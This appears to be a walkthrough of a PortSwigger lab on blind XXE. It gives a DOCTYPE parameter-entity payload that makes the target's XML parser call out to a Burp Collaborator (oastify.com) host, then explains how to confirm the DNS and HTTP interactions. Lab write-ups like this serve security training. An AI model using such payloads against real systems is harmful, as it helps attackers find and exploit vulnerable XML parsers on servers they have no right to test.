## Blind XXE with out-of-band interaction

## Solution

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/c5ab75d4-13f7-4be7-8199-4e7bfebb3146">

Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:

```<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>```

j7rrrmmq2vl217p8kg5brnjcv31upkd9.oastify.com

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/09da1934-a7b4-4dad-b3f3-d01cf9663e1e">


Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result in our payload.

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a3ba936f-4511-497d-a507-3df89e4f0c12">

<img width="1437" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/555ea42e-7af8-4e10-a17e-b9565f22ac9b">
